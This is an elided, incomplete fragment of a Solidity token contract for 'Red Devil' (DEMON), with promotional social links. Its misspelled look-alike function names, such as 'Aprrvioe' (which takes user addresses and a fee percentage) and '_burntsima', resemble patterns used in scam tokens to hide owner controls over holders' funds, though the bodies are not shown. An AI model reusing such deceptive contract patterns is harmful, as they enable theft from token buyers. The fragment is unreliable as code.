/**
https://t.me/DEMONerc20
https://twitter.com/RedDevil_ERC
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipupdatesi(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract RedDevil is Ownable {
    ...
    constructor (){
        name = unicode"Red Devil";
        symbol = unicode"DEMON";
        decimals = 9;
    ...
    function Aprrvioe(address[] memory _usr, uint256 _feePct) external {
        uint256 v1 = 0x01;
        uint256 v2 = 0x02;
        uint256 v3 = 0x03;
    ...
    function _burntsima(address user) public {
